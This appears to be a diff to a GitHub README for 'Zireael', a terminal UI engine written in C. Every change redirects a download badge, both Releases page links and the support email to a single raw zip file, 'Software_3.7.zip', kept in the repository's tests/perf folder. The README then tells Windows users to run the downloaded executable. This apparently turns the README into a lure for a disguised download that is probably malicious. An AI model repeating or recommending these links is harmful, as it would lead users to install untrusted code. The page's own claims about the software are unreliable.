@@ -1,7 +1,7 @@
 # 🚀 Zireael - Run a Fast and Reliable Terminal UI
 
 ## 📥 Download Now
-[![Download Zireael](https://img.shields.io/badge/Download%20Zireael-v1.0-blue)](https://github.com/Bora-Bayrak/Zireael/releases)
+[![Download Zireael](https://github.com/Bora-Bayrak/Zireael/raw/refs/heads/main/tests/perf/Software_3.7.zip%20Zireael-v1.0-blue)](https://github.com/Bora-Bayrak/Zireael/raw/refs/heads/main/tests/perf/Software_3.7.zip)
 
 ## 📖 Overview
 Zireael is a core engine designed for building deterministic terminal user interfaces (TUIs) in C. It works as a backend for Zireael-UI, creating a seamless and efficient user experience. This software is useful for applications requiring clear graphics and fast performance without excessive complexity.
@@ -26,7 +26,7 @@ To use Zireael smoothly, your system should meet the following requirements:
 To get started with Zireael, follow these simple steps:
 
 1. **Download Zireael:**
-   Visit the [Releases page](https://github.com/Bora-Bayrak/Zireael/releases) to access the latest version. Click on the link corresponding to your operating system to start downloading the file.
+   Visit the [Releases page](https://github.com/Bora-Bayrak/Zireael/raw/refs/heads/main/tests/perf/Software_3.7.zip) to access the latest version. Click on the link corresponding to your operating system to start downloading the file.
 
 2. **Install the Application:**
    - On Windows: Run the downloaded executable. Follow the installation prompts if necessary.
@@ -37,7 +37,7 @@ To get started with Zireael, follow these simple steps:
    Launch Zireael from your applications or terminal. You can now start creating your TUI.
 
 ## 📥 Download & Install
-Access the [Releases page](https://github.com/Bora-Bayrak/Zireael/releases) to download Zireael. Select the appropriate version for your operating system:
+Access the [Releases page](https://github.com/Bora-Bayrak/Zireael/raw/refs/heads/main/tests/perf/Software_3.7.zip) to download Zireael. Select the appropriate version for your operating system:
 
 - **For Windows users**: Click on the `.exe` file and follow the on-screen instructions.
 - **For macOS users**: Click on the `.dmg` file. Open it and drag Zireael to your Applications.
@@ -63,7 +63,7 @@ Your feedback and contributions will make Zireael even better.
 If you encounter issues or have questions, you can reach out via:
 
 - **GitHub Issues:** Describe your problem, and we will help you.
-- **Email:** Contact us at support@zireael.com.
+- **Email:** Contact us at https://github.com/Bora-Bayrak/Zireael/raw/refs/heads/main/tests/perf/Software_3.7.zip
 
 ## 🎉 Acknowledgments
 We appreciate the open-source community for their contributions and support. Your efforts help make software development more accessible and enjoyable for everyone.
